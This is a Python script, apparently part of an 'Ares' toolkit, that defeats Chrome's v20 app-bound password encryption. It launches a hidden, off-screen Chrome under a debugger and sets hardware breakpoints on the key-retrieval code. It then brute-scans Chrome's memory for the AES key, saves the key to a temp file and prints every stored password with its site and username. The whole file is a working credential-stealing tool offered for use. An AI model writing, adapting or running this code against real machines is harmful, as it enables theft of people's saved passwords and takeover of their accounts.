"""
Chrome v20 Key Extraction — Brute Scan Approach

1. Spawn chrome.exe as debugger
2. Wait for chrome.dll load → set HW breakpoint on KeyRetrieval path
3. When BP hits → status check passed → key is in heap
4. Scan ALL heap memory for 32-byte blocks
5. Try each as AES-256-GCM key against a known v20 ciphertext
6. When decrypt succeeds → that's our key!

Uses Python subprocess + ctypes for the memory scan.
"""
import ctypes as ct
from ctypes import wintypes
import sqlite3, shutil, os, sys, struct, time
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except:
    os.system(f'{sys.executable} -m pip install cryptography -q')
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

kernel32 = ct.windll.kernel32

# Constants
CREATE_SUSPENDED = 0x4
DEBUG_ONLY_THIS_PROCESS = 0x2
CREATE_NO_WINDOW = 0x08000000
STARTF_USESHOWWINDOW = 0x1
SW_HIDE = 0

EXCEPTION_DEBUG_EVENT = 1
CREATE_THREAD_DEBUG_EVENT = 2
LOAD_DLL_DEBUG_EVENT = 6
EXIT_PROCESS_DEBUG_EVENT = 5
EXCEPTION_SINGLE_STEP = 0x80000004
EXCEPTION_BREAKPOINT = 0x80000003
DBG_CONTINUE = 0x00010002
DBG_EXCEPTION_NOT_HANDLED = 0x80010001

CONTEXT_ALL = 0x10001F
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04

class STARTUPINFOW(ct.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ct.POINTER(ct.c_ubyte)), ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ct.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD),
    ]

class EXCEPTION_RECORD(ct.Structure):
    pass
EXCEPTION_RECORD._fields_ = [
    ("ExceptionCode", wintypes.DWORD), ("ExceptionFlags", wintypes.DWORD),
    ("ExceptionRecord", ct.POINTER(EXCEPTION_RECORD)),
    ("ExceptionAddress", ct.c_void_p), ("NumberParameters", wintypes.DWORD),
    ("ExceptionInformation", ct.c_ulonglong * 15),
]

class EXCEPTION_DEBUG_INFO(ct.Structure):
    _fields_ = [("ExceptionRecord", EXCEPTION_RECORD), ("dwFirstChance", wintypes.DWORD)]

class LOAD_DLL_DEBUG_INFO(ct.Structure):
    _fields_ = [
        ("hFile", wintypes.HANDLE), ("lpBaseOfDll", ct.c_void_p),
        ("dwDebugInfoFileOffset", wintypes.DWORD), ("nDebugInfoSize", wintypes.DWORD),
        ("lpImageName", ct.c_void_p), ("fUnicode", wintypes.WORD),
    ]

class DEBUG_EVENT_UNION(ct.Union):
    _fields_ = [("Exception", EXCEPTION_DEBUG_INFO), ("LoadDll", LOAD_DLL_DEBUG_INFO)]

class DEBUG_EVENT(ct.Structure):
    _fields_ = [
        ("dwDebugEventCode", wintypes.DWORD),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
        ("u", DEBUG_EVENT_UNION),
    ]

class M128A(ct.Structure):
    _fields_ = [("Low", ct.c_ulonglong), ("High", ct.c_longlong)]

class CONTEXT(ct.Structure):
    _fields_ = [
        ("P1Home", ct.c_ulonglong), ("P2Home", ct.c_ulonglong),
        ("P3Home", ct.c_ulonglong), ("P4Home", ct.c_ulonglong),
        ("P5Home", ct.c_ulonglong), ("P6Home", ct.c_ulonglong),
        ("ContextFlags", wintypes.DWORD), ("MxCsr", wintypes.DWORD),
        ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD), ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD), ("Dr0", ct.c_ulonglong),
        ("Dr1", ct.c_ulonglong), ("Dr2", ct.c_ulonglong),
        ("Dr3", ct.c_ulonglong), ("Dr6", ct.c_ulonglong),
        ("Dr7", ct.c_ulonglong), ("Rax", ct.c_ulonglong),
        ("Rcx", ct.c_ulonglong), ("Rdx", ct.c_ulonglong),
        ("Rbx", ct.c_ulonglong), ("Rsp", ct.c_ulonglong),
        ("Rbp", ct.c_ulonglong), ("Rsi", ct.c_ulonglong),
        ("Rdi", ct.c_ulonglong), ("R8", ct.c_ulonglong),
        ("R9", ct.c_ulonglong), ("R10", ct.c_ulonglong),
        ("R11", ct.c_ulonglong), ("R12", ct.c_ulonglong),
        ("R13", ct.c_ulonglong), ("R14", ct.c_ulonglong),
        ("R15", ct.c_ulonglong), ("Rip", ct.c_ulonglong),
        ("FltSave", ct.c_ubyte * 512),
        ("VectorRegister", M128A * 26),
        ("VectorControl", ct.c_ulonglong),
        ("DebugControl", ct.c_ulonglong),
        ("LastBranchToRip", ct.c_ulonglong),
        ("LastBranchFromRip", ct.c_ulonglong),
        ("LastExceptionToRip", ct.c_ulonglong),
        ("LastExceptionFromRip", ct.c_ulonglong),
    ]

class MEMORY_BASIC_INFORMATION(ct.Structure):
    _fields_ = [
        ("BaseAddress", ct.c_void_p), ("AllocationBase", ct.c_void_p),
        ("AllocationProtect", wintypes.DWORD), ("PartitionId", wintypes.WORD),
        ("RegionSize", ct.c_size_t), ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD), ("Type", wintypes.DWORD),
    ]

print("[*] Ares v20 Key Extraction — Memory Brute Scan")
print()

# Step 0: Get a v20 ciphertext sample from Login Data
la = os.environ['LOCALAPPDATA']
src = os.path.join(la, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
dst = os.path.join(os.environ['TEMP'], 'ares_bf.db')
shutil.copy2(src, dst)
conn = sqlite3.connect(dst)
samples = conn.execute(
    'SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 20 LIMIT 3'
).fetchall()
conn.close()
os.remove(dst)

v20_samples = []
for url, user, blob in samples:
    if blob[:3] == b'v20':
        nonce = blob[3:15]
        ct_data = blob[15:]
        v20_samples.append((url, user, nonce, ct_data))

print(f"[*] Got {len(v20_samples)} v20 samples for validation")
if not v20_samples:
    print("[-] No v20 samples found!")
    sys.exit(1)

# Step 1: Spawn chrome.exe as debugged process
real_profile = os.path.join(la, 'Google', 'Chrome', 'User Data')
cmd = (
    f'"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" '
    f'--no-first-run --no-default-browser-check '
    f'--window-position=-32000,-32000 --window-size=1,1 '
    f'--user-data-dir="{real_profile}"'
)

si = STARTUPINFOW()
si.cb = ct.sizeof(si)
si.dwFlags = STARTF_USESHOWWINDOW
si.wShowWindow = SW_HIDE
pi = PROCESS_INFORMATION()

print(f"[*] Launching chrome.exe...")
if not kernel32.CreateProcessW(
    None, cmd, None, None, False,
    CREATE_SUSPENDED | DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW,
    None, None, ct.byref(si), ct.byref(pi)
):
    print(f"[-] CreateProcess failed: {kernel32.GetLastError()}")
    sys.exit(1)

print(f"[+] PID: {pi.dwProcessId}")
kernel32.ResumeThread(pi.hThread)
kernel32.CloseHandle(pi.hThread)

# Step 2: Debug loop — find chrome.dll, set BP, wait for hit
marker = b"OSCrypt.AppBoundProvider.KeyRetrieval.Status"
bp_addr = 0
bp_set = False
bp_hit = False

de = DEBUG_EVENT()
timeout = 0

while not bp_hit and timeout < 120:
    if kernel32.WaitForDebugEvent(ct.byref(de), 1000):
        timeout = 0
        cont = DBG_CONTINUE
        
        if de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT:
            info = de.u.LoadDll
            dll_base = info.lpBaseOfDll
            
            # Try to read DLL name
            name_ptr = ct.c_void_p()
            if info.lpImageName:
                kernel32.ReadProcessMemory(pi.hProcess, info.lpImageName,
                    ct.byref(name_ptr), 8, None)
                if name_ptr.value:
                    name_buf = ct.create_unicode_buffer(260)
                    kernel32.ReadProcessMemory(pi.hProcess, name_ptr.value,
                        name_buf, 520, None)
                    dll_name = name_buf.value
                    
                    if dll_name.lower().endswith('chrome.dll'):
                        print(f"[+] chrome.dll at 0x{dll_base:X}")
                        
                        # Read PE header
                        pe_hdr = (ct.c_ubyte * 4096)()
                        kernel32.ReadProcessMemory(pi.hProcess, dll_base,
                            pe_hdr, 4096, None)
                        
                        e_lfanew = struct.unpack_from('<I', bytes(pe_hdr), 0x3C)[0]
                        num_secs = struct.unpack_from('<H', bytes(pe_hdr), e_lfanew + 6)[0]
                        opt_size = struct.unpack_from('<H', bytes(pe_hdr), e_lfanew + 20)[0]
                        sec_off = e_lfanew + 24 + opt_size
                        
                        rdata_base = rdata_size = text_base = text_size = 0
                        for i in range(num_secs):
                            s = sec_off + i * 40
                            name = bytes(pe_hdr[s:s+8]).rstrip(b'\x00')
                            vsize = struct.unpack_from('<I', bytes(pe_hdr), s + 8)[0]
                            rva = struct.unpack_from('<I', bytes(pe_hdr), s + 12)[0]
                            if name == b'.rdata':
                                rdata_base = dll_base + rva
                                rdata_size = vsize
                            elif name == b'.text':
                                text_base = dll_base + rva
                                text_size = vsize
                        
                        print(f"[*] .rdata: 0x{rdata_base:X} ({rdata_size})")
                        print(f"[*] .text:  0x{text_base:X} ({text_size})")
                        
                        # Find marker in .rdata
                        SCAN_SZ = 256 * 1024
                        marker_addr = 0
                        for off in range(0, rdata_size, SCAN_SZ - 64):
                            to_read = min(SCAN_SZ, rdata_size - off)
                            buf = (ct.c_ubyte * to_read)()
                            got = ct.c_size_t()
                            if kernel32.ReadProcessMemory(pi.hProcess, rdata_base + off,
                                buf, to_read, ct.byref(got)):
                                data = bytes(buf[:got.value])
                                idx = data.find(marker)
                                if idx >= 0:
                                    marker_addr = rdata_base + off + idx
                                    print(f"[+] Marker at 0x{marker_addr:X}")
                                    break
                        
                        if marker_addr:
                            # Find LEA in .text
                            for off in range(0, text_size, SCAN_SZ - 64):
                                to_read = min(SCAN_SZ, text_size - off)
                                buf = (ct.c_ubyte * to_read)()
                                got = ct.c_size_t()
                                if kernel32.ReadProcessMemory(pi.hProcess, text_base + off,
                                    buf, to_read, ct.byref(got)) and got.value > 7:
                                    data = bytes(buf[:got.value])
                                    for i in range(len(data) - 7):
                                        if data[i] == 0x48 and data[i+1] == 0x8D:
                                            modrm = data[i+2]
                                            if (modrm & 0xC7) == 0x05:
                                                disp = struct.unpack_from('<i', data, i + 3)[0]
                                                cur_rip = text_base + off + i + 7
                                                target = cur_rip + disp
                                                if target == marker_addr:
                                                    bp_addr = text_base + off + i
                                                    print(f"[+] LEA at 0x{bp_addr:X}")
                                                    break
                                    if bp_addr:
                                        break
                            
                            if bp_addr:
                                # Set hardware BP on ALL threads
                                import ctypes.wintypes
                                TH32CS_SNAPTHREAD = 0x4
                                snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
                                
                                class THREADENTRY32(ct.Structure):
                                    _fields_ = [
                                        ("dwSize", wintypes.DWORD),
                                        ("cntUsage", wintypes.DWORD),
                                        ("th32ThreadID", wintypes.DWORD),
                                        ("th32OwnerProcessID", wintypes.DWORD),
                                        ("tpBasePri", ct.c_long),
                                        ("tpDeltaPri", ct.c_long),
                                        ("dwFlags", wintypes.DWORD),
                                    ]
                                
                                te = THREADENTRY32()
                                te.dwSize = ct.sizeof(te)
                                if kernel32.Thread32First(snap, ct.byref(te)):
                                    while True:
                                        if te.th32OwnerProcessID == pi.dwProcessId:
                                            ht = kernel32.OpenThread(0x1FFFFF, False, te.th32ThreadID)
                                            if ht:
                                                ctx = CONTEXT()
                                                ctx.ContextFlags = 0x10  # CONTEXT_DEBUG_REGISTERS
                                                kernel32.GetThreadContext(ht, ct.byref(ctx))
                                                ctx.Dr0 = bp_addr
                                                ctx.Dr7 = (ctx.Dr7 & ~0xFFFF) | 0x1
                                                kernel32.SetThreadContext(ht, ct.byref(ctx))
                                                kernel32.CloseHandle(ht)
                                        if not kernel32.Thread32Next(snap, ct.byref(te)):
                                            break
                                kernel32.CloseHandle(snap)
                                bp_set = True
                                print("[+] Hardware breakpoint set!")
            
            if info.hFile:
                kernel32.CloseHandle(info.hFile)
        
        elif de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT:
            code = de.u.Exception.ExceptionRecord.ExceptionCode
            addr = de.u.Exception.ExceptionRecord.ExceptionAddress
            
            if code == EXCEPTION_SINGLE_STEP and bp_set:
                if abs(addr - bp_addr) <= 16:
                    print(f"\n[+] BREAKPOINT HIT at 0x{addr:X}!")
                    bp_hit = True
                    
                    # Clear the BP
                    ht = kernel32.OpenThread(0x1FFFFF, False, de.dwThreadId)
                    ctx = CONTEXT()
                    ctx.ContextFlags = CONTEXT_ALL
                    kernel32.GetThreadContext(ht, ct.byref(ctx))
                    ctx.Dr0 = 0
                    ctx.Dr7 &= ~0x1
                    kernel32.SetThreadContext(ht, ct.byref(ctx))
                    kernel32.CloseHandle(ht)
                else:
                    cont = DBG_EXCEPTION_NOT_HANDLED
            elif code == EXCEPTION_BREAKPOINT:
                pass  # Initial BP
            else:
                cont = DBG_EXCEPTION_NOT_HANDLED
        
        elif de.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT:
            if bp_set:
                ht = kernel32.OpenThread(0x1FFFFF, False, de.dwThreadId)
                if ht:
                    ctx = CONTEXT()
                    ctx.ContextFlags = 0x10
                    kernel32.GetThreadContext(ht, ct.byref(ctx))
                    ctx.Dr0 = bp_addr
                    ctx.Dr7 = (ctx.Dr7 & ~0xFFFF) | 0x1
                    kernel32.SetThreadContext(ht, ct.byref(ctx))
                    kernel32.CloseHandle(ht)
        
        elif de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT:
            print("[-] Chrome exited!")
            break
        
        kernel32.ContinueDebugEvent(de.dwProcessId, de.dwThreadId, cont)
    else:
        timeout += 1

if not bp_hit:
    print("[-] Breakpoint never hit, trying memory scan anyway...")

# Step 3: Scan ALL heap memory for the key
print("\n[*] Scanning chrome.exe memory for AES key...")
sample_nonce, sample_ct = v20_samples[0][2], v20_samples[0][3]
found_key = None

# Enumerate memory regions
mbi = MEMORY_BASIC_INFORMATION()
addr = 0
regions = []
while kernel32.VirtualQueryEx(pi.hProcess, addr, ct.byref(mbi), ct.sizeof(mbi)):
    if (mbi.State == MEM_COMMIT and 
        mbi.Protect in (0x04, 0x40, 0x02, 0x20, 0x08) and  # RW, RWX, R, RX, RW
        mbi.RegionSize < 100 * 1024 * 1024):  # Skip huge regions
        regions.append((mbi.BaseAddress, mbi.RegionSize))
    addr = mbi.BaseAddress + mbi.RegionSize
    if addr > 0x7FFFFFFFFFFF:
        break

print(f"[*] Found {len(regions)} memory regions to scan")
total_size = sum(r[1] for r in regions)
print(f"[*] Total: {total_size // (1024*1024)} MB")

scanned = 0
for base, size in regions:
    buf = (ct.c_ubyte * size)()
    got = ct.c_size_t()
    if not kernel32.ReadProcessMemory(pi.hProcess, base, buf, size, ct.byref(got)):
        continue
    data = bytes(buf[:got.value])
    scanned += len(data)
    
    # Try every 8-byte aligned position as a 32-byte key
    for i in range(0, len(data) - 31, 8):
        key_candidate = data[i:i+32]
        
        # Quick entropy check
        nz = sum(1 for b in key_candidate if b != 0)
        if nz < 28:
            continue
        unique = len(set(key_candidate))
        if unique < 12:
            continue
        
        # Try decrypt
        try:
            aes = AESGCM(key_candidate)
            pt = aes.decrypt(sample_nonce, sample_ct, None)
            # Check if plaintext looks reasonable
            printable = sum(1 for c in pt if 0x20 <= c < 0x7F)
            if printable > len(pt) // 2 or len(pt) < 4:
                found_key = key_candidate
                print(f"\n[+] ===== KEY FOUND! =====")
                print(f"    Address: 0x{base + i:X}")
                print(f"    Key: {key_candidate.hex().upper()}")
                print(f"    Decrypted: {pt.decode('utf-8', errors='replace')}")
                print(f"    URL: {v20_samples[0][0]}")
                print(f"    User: {v20_samples[0][1]}")
                break
        except:
            pass
    
    if found_key:
        break
    
    if scanned % (50 * 1024 * 1024) == 0:
        print(f"  Scanned {scanned // (1024*1024)} MB...")

# Cleanup
kernel32.DebugActiveProcessStop(pi.dwProcessId)
kernel32.TerminateProcess(pi.hProcess, 0)
kernel32.WaitForSingleObject(pi.hProcess, 3000)
kernel32.CloseHandle(pi.hProcess)

if found_key:
    # Save key
    key_path = os.path.join(os.environ['TEMP'], 'ares_v20_master.key')
    with open(key_path, 'wb') as f:
        f.write(found_key)
    print(f"\n[+] Key saved to {key_path}")
    
    # Decrypt all passwords
    print(f"\n[*] Decrypting all passwords...")
    shutil.copy2(src, dst)
    conn = sqlite3.connect(dst)
    all_rows = conn.execute(
        'SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 3'
    ).fetchall()
    conn.close()
    os.remove(dst)
    
    aes = AESGCM(found_key)
    for url, user, blob in all_rows:
        if blob[:3] != b'v20':
            continue
        try:
            pt = aes.decrypt(blob[3:15], blob[15:], None)
            print(f"  {url} | {user} | {pt.decode('utf-8', errors='replace')}")
        except:
            pass
else:
    print(f"\n[-] Key not found after scanning {scanned // (1024*1024)} MB")

print("\n[*] Done")
